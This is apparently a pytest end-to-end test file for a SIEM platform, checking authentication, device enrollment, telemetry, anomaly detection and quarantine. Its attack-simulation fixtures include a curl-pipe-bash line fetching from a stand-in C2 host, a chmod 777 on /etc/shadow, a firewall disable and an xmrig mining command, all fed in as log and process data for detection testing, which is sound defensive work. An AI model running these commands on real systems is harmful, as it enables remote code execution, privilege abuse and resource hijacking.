import pytest
import httpx
from httpx import ASGITransport
from datetime import datetime, timezone, timedelta
from app.main import app
from app.database.connection import Database
from app.services.ai_engine import AIEngine
from app.auth.security import get_password_hash

@pytest.mark.asyncio
async def test_complete_siem_sandbox_suite():
    """
    Comprehensive End-to-End SIEM Sandbox Test Suite.
    Validates:
      1. Health & Enrollment Installers (Agent script, bash & powershell installers)
      2. IAM & Authentication (JWT login, profile /me, password rotation, unauthorized handling)
      3. Fleet Enrollment (Token generation, listing, registration, revocation)
      4. Telemetry & Host Ingestion (Heartbeats, metrics, processes)
      5. Network Topology & Flows (Active devices, traffic stats, connection history)
      6. Centralized Logs & Humanized Search
      7. Network Attack Simulation & AI Detection (Brute-Force T1110, Reconnaissance T1046, Data Exfiltration T1048)
      8. Internal System Attack Simulation & AI Detection (Privilege Escalation T1548, Reverse Shell T1059, Defense Impairment T1562, Cryptomining T1496)
      9. Real-Time Threat Intelligence & Risk Posture (CRITICAL posture transition, MITRE distribution, anomaly investigations)
      10. Incident Response & Device Quarantine (Isolation 403 boundary enforcement, audit trail, remediation, restoration)
      11. Device Cascade Teardown
    """
    # Initialize DB connection
    await Database.connect_db()
    db = Database.db

    # Clean in-memory AI baseline windows
    AIEngine._failed_logins.clear()
    AIEngine._metric_baselines.clear()

    # Clean test users to maintain test idempotency
    await db.users.delete_many({"username": {"$in": ["soc_analyst_01", "soc_analyst_demo", "live_test_user", "auditor_test_user"]}})

    # Ensure admin user exists
    await db.users.update_one(
        {"username": "admin"},
        {"$set": {
            "password_hash": get_password_hash("admin"),
            "role": "admin",
            "must_change_password": False
        }},
        upsert=True
    )

    transport = ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://testserver") as client:

        # =========================================================================
        # 1. CORE SYSTEM HEALTH & INSTALLER SCRIPTS
        # =========================================================================
        health_res = await client.get("/health")
        assert health_res.status_code == 200
        assert health_res.json()["status"] == "ok"

        v1_health = await client.get("/api/v1/health")
        assert v1_health.status_code == 200
        assert v1_health.json()["status"] == "ok"

        # Universal Python agent script
        agent_script_res = await client.get("/api/v1/enrollment/agent.py")
        assert agent_script_res.status_code == 200
        assert b"class SIEMAgentApp" in agent_script_res.content

        # Shell installer script
        sh_installer_res = await client.get("/api/v1/enrollment/install.sh")
        assert sh_installer_res.status_code == 200
        assert b"bash" in sh_installer_res.content

        # PowerShell installer script
        ps_installer_res = await client.get("/api/v1/enrollment/install.ps1")
        assert ps_installer_res.status_code == 200
        assert b"param(" in ps_installer_res.content or b"Write-Host" in ps_installer_res.content

        # =========================================================================
        # 2. IAM & AUTHENTICATION
        # =========================================================================
        # Invalid login check
        bad_login = await client.post("/api/v1/auth/login", data={"username": "admin", "password": "wrongpassword"})
        assert bad_login.status_code == 401

        # Valid admin login
        login_res = await client.post("/api/v1/auth/login", data={"username": "admin", "password": "admin"})
        assert login_res.status_code == 200
        admin_token = login_res.json()["access_token"]
        admin_headers = {"Authorization": f"Bearer {admin_token}"}

        # Check authenticated user profile
        me_res = await client.get("/api/v1/auth/me", headers=admin_headers)
        assert me_res.status_code == 200
        assert me_res.json()["username"] == "admin"
        assert me_res.json()["role"] == "admin"

        # Registration check: Register a new SOC Analyst
        new_user_payload = {"username": "soc_analyst_01", "password": "SecurePassword123!", "role": "analyst"}
        reg_res = await client.post("/api/v1/auth/register", json=new_user_payload)
        assert reg_res.status_code == 201
        analyst_token = reg_res.json()["access_token"]
        assert analyst_token is not None

        # Verify duplicate registration is prevented
        dup_reg = await client.post("/api/v1/auth/register", json=new_user_payload)
        assert dup_reg.status_code == 400

        # Verify new user can fetch profile
        analyst_headers = {"Authorization": f"Bearer {analyst_token}"}
        analyst_me = await client.get("/api/v1/auth/me", headers=analyst_headers)
        assert analyst_me.status_code == 200
        assert analyst_me.json()["username"] == "soc_analyst_01"
        assert analyst_me.json()["role"] == "analyst"

        # Verify user differentiation: new analyst with no enrolled devices sees 0 devices, 0 tokens, and 0 threats
        analyst_devices = await client.get("/api/v1/network/active", headers=analyst_headers)
        assert analyst_devices.status_code == 200
        assert analyst_devices.json()["count"] == 0
        assert analyst_devices.json()["devices"] == []

        analyst_tokens = await client.get("/api/v1/enrollment/tokens", headers=analyst_headers)
        assert analyst_tokens.status_code == 200
        assert analyst_tokens.json() == []

        analyst_stats = await client.get("/api/v1/anomalies/stats", headers=analyst_headers)
        assert analyst_stats.status_code == 200
        assert analyst_stats.json()["active_threats"] == 0
        assert analyst_stats.json()["posture"] == "SECURE"

        # Register Auditor/Viewer user to verify read-only RBAC boundary
        auditor_res = await client.post("/api/v1/auth/register", json={
            "username": "auditor_test_user", "password": "AuditorPassword123!", "role": "viewer"
        })
        assert auditor_res.status_code == 201
        auditor_token = auditor_res.json()["access_token"]
        auditor_headers = {"Authorization": f"Bearer {auditor_token}"}

        # Viewer cannot generate enrollment tokens (RBAC enforcement)
        auditor_token_attempt = await client.post("/api/v1/enrollment/token", headers=auditor_headers)
        assert auditor_token_attempt.status_code == 403

        # Password rotation check
        pw_change = await client.post(
            "/api/v1/auth/change-password",
            headers=admin_headers,
            json={"current_password": "admin", "new_password": "NewSecureAdminPassword123!"}
        )
        assert pw_change.status_code == 200

        # Verify old password no longer works
        old_pw_res = await client.post("/api/v1/auth/login", data={"username": "admin", "password": "admin"})
        assert old_pw_res.status_code == 401

        # Verify new password works
        new_login = await client.post("/api/v1/auth/login", data={"username": "admin", "password": "NewSecureAdminPassword123!"})
        assert new_login.status_code == 200
        admin_token = new_login.json()["access_token"]
        admin_headers = {"Authorization": f"Bearer {admin_token}"}

        # Restore admin password for test reproducibility
        await client.post(
            "/api/v1/auth/change-password",
            headers=admin_headers,
            json={"current_password": "NewSecureAdminPassword123!", "new_password": "admin"}
        )

        # =========================================================================
        # 3. FLEET ENROLLMENT & CREDENTIAL LIFECYCLE
        # =========================================================================
        # Create enrollment token
        token_create_res = await client.post("/api/v1/enrollment/token?reusable=true&days_valid=7", headers=admin_headers)
        assert token_create_res.status_code == 200
        enroll_token = token_create_res.json()["token"]

        # List tokens
        tokens_list = await client.get("/api/v1/enrollment/tokens", headers=admin_headers)
        assert tokens_list.status_code == 200
        assert len(tokens_list.json()) >= 1
        token_id = tokens_list.json()[0]["id"]

        # Register sandbox endpoint
        sandbox_hostname = "SANDBOX-TITAN-01"
        sandbox_mac = "02:42:AC:11:00:22"
        sandbox_ip = "10.0.50.15"

        reg_res = await client.post("/api/v1/enrollment/register", json={
            "token": enroll_token,
            "hostname": sandbox_hostname,
            "os": "linux",
            "mac_address": sandbox_mac,
            "ip_address": sandbox_ip
        })
        assert reg_res.status_code == 200
        device_id = reg_res.json()["device_id"]
        device_token = reg_res.json()["device_credential"]
        device_headers = {"Authorization": f"Bearer {device_token}"}

        # Test token revocation
        revoke_res = await client.delete(f"/api/v1/enrollment/tokens/{token_id}", headers=admin_headers)
        assert revoke_res.status_code == 200

        # Verify revoked token cannot register new device
        rejected_reg = await client.post("/api/v1/enrollment/register", json={
            "token": enroll_token,
            "hostname": "ROGUE-PC",
            "os": "linux",
            "mac_address": "02:42:AC:11:00:99",
            "ip_address": "10.0.50.99"
        })
        assert rejected_reg.status_code == 400

        # =========================================================================
        # 4. TELEMETRY, METRICS & PROCESS INGESTION
        # =========================================================================
        now_utc = datetime.now(timezone.utc)

        # Send heartbeat
        hb_res = await client.post("/api/v1/agent/heartbeat", headers=device_headers, json={
            "device_id": device_id,
            "timestamp": now_utc.isoformat(),
            "status": "online"
        })
        assert hb_res.status_code == 200
        assert hb_res.json()["status"] == "ok"

        # Send baseline metrics
        metrics_payload = [{
            "timestamp": (now_utc - timedelta(seconds=10)).isoformat(),
            "device_id": device_id,
            "cpu_percent": 18.5,
            "memory_percent": 34.2,
            "memory_used_mb": 2800,
            "memory_total_mb": 8192,
            "disk_percent": 45.0,
            "network_tx_bytes": 1024 * 1024,
            "network_rx_bytes": 2048 * 1024
        }]
        metrics_res = await client.post("/api/v1/agent/metrics", headers=device_headers, json={
            "device_id": device_id,
            "metrics": metrics_payload
        })
        assert metrics_res.status_code == 200

        # Send baseline processes
        procs_payload = [
            {"pid": 1, "name": "systemd", "cpu_percent": 0.1, "memory_percent": 0.5, "executable": "/usr/lib/systemd/systemd"},
            {"pid": 110, "name": "sshd", "cpu_percent": 0.0, "memory_percent": 0.2, "executable": "/usr/sbin/sshd"},
            {"pid": 250, "name": "python3", "cpu_percent": 1.2, "memory_percent": 2.1, "executable": "/usr/bin/python3"}
        ]
        procs_res = await client.post("/api/v1/agent/processes", headers=device_headers, json={
            "device_id": device_id,
            "processes": procs_payload
        })
        assert procs_res.status_code == 200

        # Verify device state in admin portal
        dev_res = await client.get(f"/api/v1/devices/{device_id}", headers=admin_headers)
        assert dev_res.status_code == 200
        assert dev_res.json()["status"] == "online"
        assert dev_res.json()["hostname"] == sandbox_hostname

        # Verify metrics query
        dev_metrics = await client.get(f"/api/v1/devices/{device_id}/metrics", headers=admin_headers)
        assert dev_metrics.status_code == 200
        assert len(dev_metrics.json()) >= 1

        # Verify processes query
        dev_procs = await client.get(f"/api/v1/devices/{device_id}/processes", headers=admin_headers)
        assert dev_procs.status_code == 200
        assert len(dev_procs.json().get("processes", [])) >= 3

        # =========================================================================
        # 5. NETWORK TOPOLOGY & FLOWS
        # =========================================================================
        active_net = await client.get("/api/v1/network/active", headers=admin_headers)
        assert active_net.status_code == 200
        assert any(d["device_id"] == device_id for d in active_net.json().get("devices", []))

        traffic_res = await client.get("/api/v1/network/traffic", headers=admin_headers)
        assert traffic_res.status_code == 200

        history_res = await client.get("/api/v1/network/history", headers=admin_headers)
        assert history_res.status_code == 200

        # =========================================================================
        # 6. CENTRALIZED LOGS & SEARCH
        # =========================================================================
        routine_logs = [
            {
                "timestamp": now_utc.isoformat(),
                "device_id": device_id,
                "os": "linux",
                "source_type": "auth",
                "source": "login",
                "event_id": "pam_unix",
                "event_type": "security",
                "severity": "information",
                "message": "Session opened for user analyst",
                "raw_log": "pam_unix(login:session): session opened for user analyst"
            },
            {
                "timestamp": now_utc.isoformat(),
                "device_id": device_id,
                "os": "linux",
                "source_type": "network",
                "source": "dns_cache",
                "event_id": "dns_query",
                "event_type": "network",
                "severity": "information",
                "message": "Resolved domain api.internal-cloud.local to 10.0.50.2",
                "raw_log": "dns: query api.internal-cloud.local answer 10.0.50.2"
            }
        ]
        log_ingest = await client.post("/api/v1/agent/logs", headers=device_headers, json={
            "device_id": device_id,
            "logs": routine_logs
        })
        assert log_ingest.status_code == 200

        # Search logs
        search_logs = await client.get("/api/v1/logs?device_id=" + device_id, headers=admin_headers)
        assert search_logs.status_code == 200
        assert len(search_logs.json().get("logs", [])) >= 1

        # Log statistics
        log_stats = await client.get("/api/v1/logs/stats", headers=admin_headers)
        assert log_stats.status_code == 200
        assert log_stats.json()["logs_total"] >= 1

        # =========================================================================
        # 7. NETWORK ATTACK SIMULATION & INSTANT AI DETECTION
        # =========================================================================
        # Attack 1: Credential Brute-Force Wave (MITRE T1110)
        brute_force_logs = [
            {
                "timestamp": now_utc.isoformat(),
                "device_id": device_id,
                "os": "linux",
                "source_type": "journald",
                "source": "sshd",
                "event_id": "sshd",
                "event_type": "security",
                "severity": "error",
                "message": f"Failed password for invalid user root from 185.220.101.45 port {40000 + i} ssh2",
                "raw_log": f"sshd[{1500+i}]: Failed password for invalid user root from 185.220.101.45"
            }
            for i in range(4)
        ]
        bf_res = await client.post("/api/v1/agent/logs", headers=device_headers, json={
            "device_id": device_id,
            "logs": brute_force_logs
        })
        assert bf_res.status_code == 200

        # Attack 2: Reconnaissance Port Scanner (MITRE T1046)
        scanner_procs = [
            {"pid": 301, "name": "nmap", "cpu_percent": 12.0, "memory_percent": 1.5, "executable": "/usr/bin/nmap -sS 10.0.50.0/24"}
        ]
        scan_res = await client.post("/api/v1/agent/processes", headers=device_headers, json={
            "device_id": device_id,
            "processes": scanner_procs
        })
        assert scan_res.status_code == 200

        # Attack 3: Massive Outbound Network Exfiltration (MITRE T1048)
        exfil_metrics = [{
            "timestamp": now_utc.isoformat(),
            "device_id": device_id,
            "cpu_percent": 25.0,
            "memory_percent": 40.0,
            "memory_used_mb": 3200,
            "memory_total_mb": 8192,
            "disk_percent": 45.0,
            "network_tx_bytes": 75 * 1024 * 1024,  # +74 MB burst
            "network_rx_bytes": 2048 * 1024
        }]
        exfil_res = await client.post("/api/v1/agent/metrics", headers=device_headers, json={
            "device_id": device_id,
            "metrics": exfil_metrics
        })
        assert exfil_res.status_code == 200

        # =========================================================================
        # 8. INTERNAL SYSTEM ATTACK SIMULATION & INSTANT AI DETECTION
        # =========================================================================
        # Attack 4: Privilege Escalation & Sensitive File Tampering (MITRE T1548)
        priv_esc_log = [{
            "timestamp": now_utc.isoformat(),
            "device_id": device_id,
            "os": "linux",
            "source_type": "auditd",
            "source": "sudo",
            "event_id": "EXECVE",
            "event_type": "security",
            "severity": "error",
            "message": "sudo chmod 777 /etc/shadow executed by low-privilege user analyst",
            "raw_log": "type=EXECVE a0=\"sudo\" a1=\"chmod\" a2=\"777\" a3=\"/etc/shadow\""
        }]
        priv_res = await client.post("/api/v1/agent/logs", headers=device_headers, json={
            "device_id": device_id,
            "logs": priv_esc_log
        })
        assert priv_res.status_code == 200

        # Attack 5: Interactive Reverse Shell Execution (MITRE T1059)
        rev_shell_log = [{
            "timestamp": now_utc.isoformat(),
            "device_id": device_id,
            "os": "linux",
            "source_type": "bash_history",
            "source": "bash",
            "event_id": "REVERSE_SHELL",
            "event_type": "security",
            "severity": "critical",
            "message": "curl http://malicious.c2/payload.sh | bash",
            "raw_log": "bash -c 'curl http://malicious.c2/payload.sh | bash'"
        }]
        rev_res = await client.post("/api/v1/agent/logs", headers=device_headers, json={
            "device_id": device_id,
            "logs": rev_shell_log
        })
        assert rev_res.status_code == 200

        # Attack 6: Host Defense Impairment / Firewall Disable (MITRE T1562)
        defense_log = [{
            "timestamp": now_utc.isoformat(),
            "device_id": device_id,
            "os": "linux",
            "source_type": "systemctl",
            "source": "ufw",
            "event_id": "FIREWALL_DOWN",
            "event_type": "security",
            "severity": "error",
            "message": "ufw disable executed; host firewall deactivated",
            "raw_log": "systemd[1]: Stopped Uncomplicated firewall; ufw disable"
        }]
        def_res = await client.post("/api/v1/agent/logs", headers=device_headers, json={
            "device_id": device_id,
            "logs": defense_log
        })
        assert def_res.status_code == 200

        # Attack 7: Cryptomining Process & Sustained CPU Hijack (MITRE T1496)
        miner_procs = [
            {"pid": 404, "name": "xmrig", "cpu_percent": 96.0, "memory_percent": 15.0, "executable": "/tmp/.hidden/xmrig -o pool.minexmr.com:4444"}
        ]
        miner_proc_res = await client.post("/api/v1/agent/processes", headers=device_headers, json={
            "device_id": device_id,
            "processes": miner_procs
        })
        assert miner_proc_res.status_code == 200

        # =========================================================================
        # 9. REAL-TIME THREAT INTELLIGENCE & RISK POSTURE VALIDATION
        # =========================================================================
        threat_stats = await client.get("/api/v1/anomalies/stats", headers=admin_headers)
        assert threat_stats.status_code == 200
        stats_body = threat_stats.json()
        assert stats_body["posture"] == "CRITICAL"
        assert stats_body["risk_score"] > 70
        assert stats_body["active_threats"] >= 5

        # Query all active anomalies
        active_threats_res = await client.get("/api/v1/anomalies?status=active", headers=admin_headers)
        assert active_threats_res.status_code == 200
        anomalies_list = active_threats_res.json()["anomalies"]
        mitre_ids_found = {a["mitre_id"] for a in anomalies_list}

        # Validate MITRE ATT&CK coverage
        assert "T1110" in mitre_ids_found  # Brute Force
        assert "T1046" in mitre_ids_found  # Port Scan
        assert "T1048" in mitre_ids_found  # Exfiltration
        assert "T1548" in mitre_ids_found  # Privilege Escalation
        assert "T1059" in mitre_ids_found  # Reverse Shell
        assert "T1562" in mitre_ids_found  # Impair Defenses

        # Validate Anomaly Detailed Investigation Card
        sample_anomaly = anomalies_list[0]
        anomaly_id = sample_anomaly["_id"]
        detail_res = await client.get(f"/api/v1/anomalies/{anomaly_id}", headers=admin_headers)
        assert detail_res.status_code == 200
        detail = detail_res.json()
        assert "evidence" in detail
        assert "root_cause" in detail
        assert "recommended_action" in detail
        assert detail["device_id"] == device_id

        # =========================================================================
        # 10. INCIDENT RESPONSE: DEVICE ISOLATION & SAFE RESTORATION
        # =========================================================================
        # Phase 1: Trigger 1-Click Device Quarantine
        isolate_res = await client.post(f"/api/v1/devices/{device_id}/isolate", headers=admin_headers)
        assert isolate_res.status_code == 200
        assert isolate_res.json()["status"] == "isolated"

        # Verify device status in DB is isolated
        dev_check = await client.get(f"/api/v1/devices/{device_id}", headers=admin_headers)
        assert dev_check.status_code == 200
        assert dev_check.json()["status"] == "isolated"

        # Phase 2: Verify Strict Boundary Enforcement (Device is blocked from communicating)
        # Attempt heartbeat from isolated device -> MUST return HTTP 403 Forbidden
        blocked_hb = await client.post("/api/v1/agent/heartbeat", headers=device_headers, json={
            "device_id": device_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "status": "online"
        })
        assert blocked_hb.status_code == 403
        assert "isolated" in blocked_hb.json()["detail"].lower()

        # Attempt log ingestion from isolated device -> MUST return HTTP 403 Forbidden
        blocked_log = await client.post("/api/v1/agent/logs", headers=device_headers, json={
            "device_id": device_id,
            "logs": routine_logs
        })
        assert blocked_log.status_code == 403

        # Phase 3: Verify Audit Timeline records isolation event
        events_res = await client.get(f"/api/v1/devices/{device_id}/events", headers=admin_headers)
        assert events_res.status_code == 200
        events_list = events_res.json() if isinstance(events_res.json(), list) else events_res.json().get("events", [])
        assert any(e.get("event") == "isolated" for e in events_list)

        # Phase 4: Threat Remediation - Resolve active anomalies
        resolve_res = await client.post(f"/api/v1/anomalies/{anomaly_id}/resolve", headers=admin_headers)
        assert resolve_res.status_code == 200
        assert resolve_res.json()["status"] == "ok"

        # Phase 5: Safe Device Restoration
        restore_res = await client.post(f"/api/v1/devices/{device_id}/restore", headers=admin_headers)
        assert restore_res.status_code == 200
        assert restore_res.json()["status"] == "online"

        # Verify device status restored
        dev_check2 = await client.get(f"/api/v1/devices/{device_id}", headers=admin_headers)
        assert dev_check2.status_code == 200
        assert dev_check2.json()["status"] == "online"

        # Verify device communications resume successfully
        resumed_hb = await client.post("/api/v1/agent/heartbeat", headers=device_headers, json={
            "device_id": device_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "status": "online"
        })
        assert resumed_hb.status_code == 200
        assert resumed_hb.json()["status"] == "ok"

        # =========================================================================
        # 11. DEVICE LIFECYCLE DELETION
        # =========================================================================
        # Verify non-admin (Analyst) cannot delete devices (RBAC enforcement)
        unauthorized_del = await client.delete(f"/api/v1/devices/{device_id}", headers=analyst_headers)
        assert unauthorized_del.status_code == 403

        del_res = await client.delete(f"/api/v1/devices/{device_id}", headers=admin_headers)
        assert del_res.status_code == 200
        assert del_res.json()["status"] == "deleted"

        # Confirm 404
        post_del = await client.get(f"/api/v1/devices/{device_id}", headers=admin_headers)
        assert post_del.status_code == 404

    await Database.close_db()
